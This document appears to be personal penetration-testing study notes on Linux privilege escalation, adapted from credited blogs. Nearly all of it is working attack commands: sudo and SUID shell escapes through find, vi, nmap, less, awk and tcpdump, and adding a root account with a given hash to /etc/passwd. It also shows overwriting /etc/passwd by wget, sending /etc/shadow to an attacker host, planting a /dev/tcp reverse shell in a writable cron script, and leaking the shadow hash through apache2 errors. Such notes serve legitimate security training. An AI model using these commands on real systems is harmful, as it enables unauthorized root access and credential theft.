# Linux Privilege Escalation

---- Credits ----
Touhid M.Shaikh @ https://touhidshaikh.com/blog/?p=790
https://www.jpsecnetworks.com/week-8-oscp-preparation-post-exploitation/

---- Modified to add my own notes and formatting in ----


## SUID bit exploitables

Sudoers File

    /etc/sudoers

Sudoer File Syntax.

    root ALL=(ALL) ALL

Explain 1: The root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.

The first part is the user, the second is the terminal from where the user can use the sudocommand, the third part is which users he may act as, and the last one is which commands he may run when using.sudo

    user1 ALL= /sbin/poweroff

Explain 2: The above command, makes the user user1 can from any terminal, run the command power off using user1’s user password.

    user1 ALL = (root) NOPASSWD: /usr/bin/find

Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.



Find out what SUDO permissions you have. The user may run these binary files without as root without password

    sudo -l

Also possible to check all files with SUID bits set with

        find / -perm -u=s -type f 2>/dev/null
        or
        find / -perm -4000 -type f 2>/dev/null



**Something interesting Ippsec shared***

~~~bash
find home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column t

\t means tab, \n means newline
~~~



**Listing**

Here is a brief list of the exploitable binaries. Exact commands are in next section

    awk
    cp / mv
    find
    less
    man
    more
    nano
    nmap
    wget
    vi
    vim

Secondary List, not tested

sudo mount -o bind /bin/bash /bin/mount
sudo mount


$ echo $’id\ncat /etc/shadow’ > /tmp/.test
$ chmod +x /tmp/.test
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

sudo strace -o/dev/null /bin/bash



---- Individual Commands ----

Using CP or MV

        copy and overwrite passwd file

Using Find Command

    sudo find /etc/passwd -exec /bin/sh \;
    or
    
    sudo find /bin -name nano -exec /bin/sh \;

Using Vi Command

    sudo vi
    :shell
    
    :set shell=/bin/bash:shell    
    :!bash

Using Vim Command

    sudo vim -c '!sh'

Using Nmap Command
Old way.

    sudo nmap --interactive
    nmap> !sh
    sh-4.1#
    or
    !bash -p
    Note : nmap –interactive option not available in latest nmap.

Latest Way without –interactive

    echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse


Using Man Command

    sudo man man

after that press !sh and hit enter


Using Less/More Command (extra stuff below)

    sudo less /etc/hosts
    sudo more /etc/hosts
    after that press !sh and hit enter

From Less you can also go into vi into a shell

       sudo less /etc/shadow
       v
       :shell

You need to run more on a file that is bigger than your screen.

        sudo more /home/pelle/myfile
        !/bin/bash

Using awk Command

    sudo awk 'BEGIN {system("/bin/sh")}'

Using nano Command
nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.

    sudo nano  /etc/passwd
    add this line:
    user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash


now switch user password with password : test

    su user1



Using wget Command
this very cool way which requires a Web Server to download a file. This way i never saw on anywhere. lets explain this.

On Attaker Side.

First Copy Target’s /etc/passwd file to attacker machine.
modify file and add a user in passwd file which is saved in the previous step to the attacker machine.
append this line only => 

    user1:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash

host that passwd file to using any web server.
On Victim Side.

    sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd

now switch user password  : test

    su user1


Note: if u want to dump file from a server like a root’s ssh key, Shadow file etc.

    sudo wget --post-file=/etc/shadow 192.168.56.1:8080
    Setup Listener on attacker : nc –lvp 8080


## crontab

By looking at the scheduled cron jobs we can see a script that can be edited using low priv. We can use that to insert a reverse shell code.

    /etc/cron.hourly:
    total 24
    drwxr-xr-x 2 root root 4096 out 16 23:21 .
    drwxr-xr-x 135 root root 12288 out 16 18:41 ..
    -rwxrwxrwx 1 root root 57 out 16 23:21 getinfo.sh <---
    -rw-r–r– 1 root root 102 nov 16 2017 .placeholder


echo ‘bash -i >& /dev/tcp/192.168.0.109/8080 0>&1’ > getinfo.sh

    cat getinfo.sh
    #!/bin/bash
    
    bash -i >& /dev/tcp/192.168.0.109/8080 0>&1

Now we can setup another nc and run the script and wait until the cron job runs. It will run as a root user.

On Kali Linux:

    root@kali:/scripts/privesc# nc -nlvp 8080


**Other**

Checking for running services running as root

        ps aux

MySQL

if this is running as root you can run commands if you are able to log in:

        select sys_exec('whoami');
        select sys_eval('whoami');



Using apache Command
sadly u cant get Shell and Cant edit system files.

but using this u can view system files.

    sudo apache2 -f /etc/shadow


Output is like this :

    Syntax error on line 1 of /etc/shadow:
    Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration


Sadly no Shell. But you manage to extract root hash now Crack hash in your machine. For Shadow Cracking click here for more.



Super long list here:

https://gtfobins.github.io/

## Kernel Exploits

To be avoided if possible, as it may cause crashes

Check Version

        uname -a
        cat /proc/version
        cat /etc/issue

Search for exploits

        site:exploit-db.com kernel version
    
        python linprivchecker.py extended
